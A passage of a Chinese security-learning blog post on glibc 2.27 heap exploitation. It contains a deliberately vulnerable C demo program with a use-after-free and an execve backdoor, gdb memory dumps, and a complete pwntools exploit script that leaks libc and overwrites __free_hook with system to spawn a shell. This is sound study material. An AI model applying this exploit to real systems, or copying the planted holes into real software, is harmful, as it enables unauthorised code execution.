+<li><p>free_hook的存储的位置,在 free_hook上方 -0xb58 我们可以找到满足top_chunk要求的大小</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;__free_hook</span><br><span class="line">$5 = (void (**)(void *, const void *)) 0x7ffff7dd77a8 &lt;__free_hook&gt;</span><br><span class="line">gdb-peda$ x/8gx 0x7ffff7dd77a8 -0xb58</span><br><span class="line">0x7ffff7dd6c50 &lt;initial+16&gt;:	0x0000000000000004	0x697b5349788728d7</span><br><span class="line">0x7ffff7dd6c60 &lt;initial+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7ffff7dd6c70 &lt;initial+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>伪造的fastbin的addr为0x7ffff7dd6c50，当程序可以在该位置申请chunk的时候，通过重复向top_chunk申请，最终覆写__free_hook的值为system的值通过free &#x2F;bin&#x2F;sh\x00的chunk,达到程序流劫持getshell。</p>
+</li>
+</ul>
+</li>
+<li><p>修改global_max_fast,但是这依赖于可以malloc的chunk的大小是可控的</p>
+<ul>
+<li><p>通过fastbin attack 使得可以malloc 指定包含free_hook大小的chunk，比如利用0x7ffff7dd6c58处的值，但是这里要合理去构造偏移</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/200gx 0x7ffff7dd77a8-0xC00</span><br><span class="line">0x7ffff7dd6ba8 &lt;lock+8&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">....</span><br><span class="line">0x7ffff7dd6c48 &lt;initial+8&gt;:	0x0000000000000001	0x0000000000000004</span><br><span class="line">0x7ffff7dd6c58 &lt;initial+24&gt;:	0xbf378114d045c300	0x0000000000000000</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>通过unsorted_bin attack 来写入free_hook上方0x7f的值，可以在free_hook上方伪造出0x7f大小的chunk,再可以通过fastbin attack 来malloc得到包含free_hook的chunk，写入system的地址，通过free(&#x2F;bin&#x2F;sh)来实现利用。</p>
+</li>
+</ul>
+<p>注：由于2.27的tcache不对size位进行检查，所以我不需要去找到free_hook去伪造chunk，再通过fastbin attack，同时注意tcache bin也是可以进行doublefree</p>
+</li>
+</ul>
+<h2 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h2><p>演示脚本：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *chunk_list[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. add chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. delete chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. edit chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. show chunk&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;choice:&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_num</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add_chunk</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = get_num();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;size:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> size = get_num();</span><br><span class="line">    chunk_list[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete_chunk</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = get_num();</span><br><span class="line">    <span class="built_in">free</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit_chunk</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = get_num();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;length:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> length = get_num();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, chunk_list[index], length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show_chunk</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;index:&quot;</span>);</span><br><span class="line">    <span class="type">int</span> index = get_num();</span><br><span class="line">    <span class="built_in">puts</span>(chunk_list[index]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> shell[] = <span class="string">&quot;/bin/sh&quot;</span>; </span><br><span class="line">	<span class="keyword">asm</span> (</span><br><span class="line">		<span class="string">&quot;xor %%rdi, %%rdi;&quot;</span>             </span><br><span class="line">		<span class="string">&quot;xor %%rsi, %%rsi;&quot;</span>             </span><br><span class="line">		<span class="string">&quot;xor %%rdx, %%rdx;&quot;</span>             </span><br><span class="line">		<span class="string">&quot;mov $0x3b, %%rax;&quot;</span>             </span><br><span class="line">		<span class="string">&quot;lea %0, %%rdi;&quot;</span>                 </span><br><span class="line">		<span class="string">&quot;syscall;&quot;</span>                      </span><br><span class="line">		:</span><br><span class="line">			: <span class="string">&quot;m&quot;</span> (shell)                    </span><br><span class="line">			: <span class="string">&quot;%rax&quot;</span>, <span class="string">&quot;%rdi&quot;</span>, <span class="string">&quot;%rsi&quot;</span>, <span class="string">&quot;%rdx&quot;</span> </span><br><span class="line">			);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        menu();</span><br><span class="line">        <span class="type">int</span> choice = get_num();</span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                add_chunk();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                delete_chunk();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                edit_chunk();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                show_chunk();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;invalid choice %d.\n&quot;</span>, choice);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译之后patchelf一个2.27的libc，理论上低版本编译是可以切换高版本的libc，高版本编译切换不了低版本的libc，所以我建议是使用ubuntu16.04去编译这个heap.c源文件，这样一个heap文件可以复现很多堆的漏洞，我觉得这个demo还是很方便的，可以自己复现一些堆的漏洞，更好的总结吧</p>
+<h3 id="unsortbin泄露"><a href="#unsortbin泄露" class="headerlink" title="unsortbin泄露"></a>unsortbin泄露</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>由于上述的demo中有uaf漏洞，所以这里可以利用unsortedbin中的特点去泄露libc（但是2.29引入了UsortedBin Attack的缓解机制，这里总结的是2.27堆的简单攻击，所以不再多述）</p>
+<p><img src="/../images/blog/image-20251025144504488.png" alt="image-20251025144504488"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p>这里计算出了libc</p>
+<h2 id="简单攻击"><a href="#简单攻击" class="headerlink" title="简单攻击"></a>简单攻击</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># add(6, 0x60)</span></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">5</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">6</span>) </span><br></pre></td></tr></table></figure>
+
+<p>这里首先进行doublefree，然后第一次edit3修改fd指针为free_hook</p>
+<p><img src="/../images/blog/image-20251025204425250.png" alt="image-20251025204425250"  data-tag='post-image' onload='this.onload=null;this.style.opacity=1;' loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p>将free_hook申请出来到堆上，然后我们在堆上去修改，将free_hook修改为system，（其实也可以修改成ogg的，但是我没有成功）</p>
+<p>最后再次创建一个chunk6，修改chunk6里面的内容为&#x2F;bin&#x2F;sh，free掉，即是调用system（&#x2F;bin&#x2F;sh）。</p>
+<h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">&#x27;./heap&#x27;</span>) </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./heap&#x27;</span>) </span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/zzt/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice:&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;size:&quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice:&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, length, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice:&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index:&quot;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;length:&quot;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice:&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;index:&quot;</span>,<span class="string">b&#x27;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">leak = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = u64(leak.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">ogg = libc_base + <span class="number">0x10a38c</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">payload = p64(free_hook)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line"><span class="comment"># add(6, 0x60)</span></span><br><span class="line">payload = p64(system)</span><br><span class="line">edit(<span class="number">5</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">6</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># debug(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12000">Tcache attack-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/#malloc-hook%E4%BB%A5%E5%8F%8A-free-hook%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86">malloc_hook以及free_hook劫持原理 | S3cana’s Blog</a></p>
+
+</article>
+    
+    <div class="trm-reward">
+        
+            <span class="trm-reward-btn trm-glow" onclick='var qr = document.getElementById("qr"); qr.style.display = (qr.style.display === "none") ? "block" : "none";'>
+                <i class="iconfont fas fa-hand-holding-usd"></i>
+            </span>
+        
+        <p class="trm-reward-comment">I'm so cute. Please give me money.</p>
+        <div id="qr" style="display:none;">
+            
+                <div style="display:inline-block">
+                    <a rel="noopener noreferrer" href='zhifubao.png' target='_blank' >
+                       <img src="/zhifubao.png" alt="支付宝" loading="lazy">
+                    </a>
+                    <p>支付宝</p>
+                </div>
+            
+                <div style="display:inline-block">
+                    <a rel="noopener noreferrer" href='weixin.png' target='_blank' >
+                       <img src="/weixin.png" alt="微信" loading="lazy">
+                    </a>
+                    <p>微信</p>
+                </div>
+            
+        </div>
+    </div>
+
+    
+
+<ul class="trm-post-copyright">
+    <li class="trm-post-copyright-author">
+        <strong>本文作者：</strong>
+        enp0
+    </li>
+    <li class="trm-post-copyright-link">
+        <strong>本文链接：</strong>
+        <a id="original-link" href="https://www.imalun.com/2025/10/25/在2.27版本中尝试进行堆的简单攻击/" title="">https://www.imalun.com/2025/10/25/在2.27版本中尝试进行堆的简单攻击/</a>
+    </li>
+    <li class="trm-post-copyright-license">
+        <strong>版权声明：</strong>
+        本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 ">CC BY-NC-SA 4.0</a> 许可协议。
+    </li>
+</ul>
+
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/2025/07/17/axb-2019-fmt64/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <img alt="cover" class="no-fancybox" src="/images/3.png">
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E3%80%8Abuu%E5%88%B7%E9%A2%98%E8%B7%AF%E3%80%8B/">
+                    《buu刷题路》
+                </a>
+            </div>
+            <h5>
+                <a href="/2025/07/17/axb-2019-fmt64/" class="trm-anima-link">
+                    axb_2019_fmt64
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>25/07/17</li>
+                <li>16:12</li>
+                
+                    <li>1k</li>
+                
+                
+                    <li>5</li>
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+</div>
+
+    
+
+
+
+                    <div class="trm-divider footer-divider"></div>
+
+                    <!-- footer -->
+                    <footer class="trm-footer-card trm-scroll-animation">
+
+    
+
+    
+        <div class="trm-footer-item">
+            <span>© 2025 - 2025</span>
+            <span class="footer-separator"data-separator=" · "></span>
+            <span class="trm-accent-color">enp0</span>
+        </div>
+    
+
+    
+        <div class="trm-footer-item">
+            <span>
+                由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0
+            </span>
+            <span class="footer-separator" data-separator=" | "></span>
+            <span> 
+                主题 - 
+                <a rel="noopener" href='https://github.com/MaLuns/hexo-theme-async' target='_blank'>Async</a>
+                v2.2.6
+            </span>
+        </div>
+      
+
+    
+        <div class="trm-footer-item blog-run-long"></div>
+     
+
+     
+</footer>
+                    <!-- footer end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+            <!-- body end -->
+
+            
+
+    <div id="post-toc" class="trm-post-toc">
+      <div class="trm-post-toc-header">
+        目录导航
+				<span id="post-toc-top">
+					置顶
+				</span>
+      </div>
+      <div class="trm-post-toc-content">
+        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-1" title="在2.27版本中尝试进行堆的简单攻击"><a rel="nofollow" class="trm-toc-link" href="#在2-27版本中尝试进行堆的简单攻击"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">在2.27版本中尝试进行堆的简单攻击</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-2" title="tcache bin 基础"><a rel="nofollow" class="trm-toc-link" href="#tcache-bin-基础"><span class="trm-toc-number">1.1.</span> <span class="trm-toc-text">tcache bin 基础</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="执行流程"><a rel="nofollow" class="trm-toc-link" href="#执行流程"><span class="trm-toc-number">1.1.1.</span> <span class="trm-toc-text">执行流程</span></a></li><li class="trm-toc-item trm-toc-level-3" title="__malloc_hook以及__free_hoook的作用"><a rel="nofollow" class="trm-toc-link" href="#malloc-hook以及-free-hoook的作用"><span class="trm-toc-number">1.1.2.</span> <span class="trm-toc-text">__malloc_hook以及__free_hoook的作用</span></a></li><li class="trm-toc-item trm-toc-level-3" title="劫持原理"><a rel="nofollow" class="trm-toc-link" href="#劫持原理"><span class="trm-toc-number">1.1.3.</span> <span class="trm-toc-text">劫持原理</span></a></li><li class="trm-toc-item trm-toc-level-3" title="malloc_hook"><a rel="nofollow" class="trm-toc-link" href="#malloc-hook"><span class="trm-toc-number">1.1.4.</span> <span class="trm-toc-text">malloc_hook</span></a></li><li class="trm-toc-item trm-toc-level-3" title="free_hook"><a rel="nofollow" class="trm-toc-link" href="#free-hook"><span class="trm-toc-number">1.1.5.</span> <span class="trm-toc-text">free_hook</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="泄露libc"><a rel="nofollow" class="trm-toc-link" href="#泄露libc"><span class="trm-toc-number">1.2.</span> <span class="trm-toc-text">泄露libc</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="unsortbin泄露"><a rel="nofollow" class="trm-toc-link" href="#unsortbin泄露"><span class="trm-toc-number">1.2.1.</span> <span class="trm-toc-text">unsortbin泄露</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="简单攻击"><a rel="nofollow" class="trm-toc-link" href="#简单攻击"><span class="trm-toc-number">1.3.</span> <span class="trm-toc-text">简单攻击</span></a></li><li class="trm-toc-item trm-toc-level-2" title="exp："><a rel="nofollow" class="trm-toc-link" href="#exp："><span class="trm-toc-number">1.4.</span> <span class="trm-toc-text">exp：</span></a></li><li class="trm-toc-item trm-toc-level-2" title="参考文章"><a rel="nofollow" class="trm-toc-link" href="#参考文章"><span class="trm-toc-number">1.5.</span> <span class="trm-toc-text">参考文章</span></a></li></ol></li></ol>
+      </div>
+    </div>
+
+            
+<div class="trm-fixed-container">
+    
+        <div class="trm-fixed-btn post-toc-btn" data-title="目录">
+            <i class="iconfont fas fa-th-list"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn" data-title="阅读模式" onclick="asyncFun.switchReadMode()">
+            <i class="iconfont fas fa-book-reader"></i>
+        </div>
+    
+    
+        <div class="trm-fixed-btn hidden-md" data-title="单栏和双栏切换" onclick="asyncFun.switchSingleColumn()">
+            <i class="iconfont fas fa-arrows-alt-h"></i>
+        </div>
+    
+    <div id="trm-back-top" class="trm-fixed-btn" data-title="回到顶部">
+        <i class="iconfont fas fa-arrow-up"></i>
+    </div>
+</div>
+        </div>
+      </div>
+      <!-- scroll container end -->
+  </div>
+  <!-- app wrapper end -->
+
+  
+  <!-- Plugin -->
+
+
+
+
+    
+    
+<script src="https://npm.elemecdn.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
+
+    
+
+    
+        <script src="/js/plugins/typing.js?v=2.2.6"></script>
+    
+
+    
+
+    <!-- 数学公式 -->
+    
+
+    <!-- 评论插件 -->
+    
+        
+
+        
+    
+
+		
+
+
+
+
+    <!-- Service Worker -->
+    
+    <!-- baidu push -->
+    
+    <script data-swup-reload-script>
+        (function () {
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') {
+                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            }
+            else {
+                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+            }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+
+
+
+<script id="async-script" src="/js/main.js?v=2.2.6"></script>
+
+<!-- CDN -->
+
+
+    
+<script src="/demo.js"></script>
+
+
+    
+
+    
+
+
+
+</body>
+
+</html>
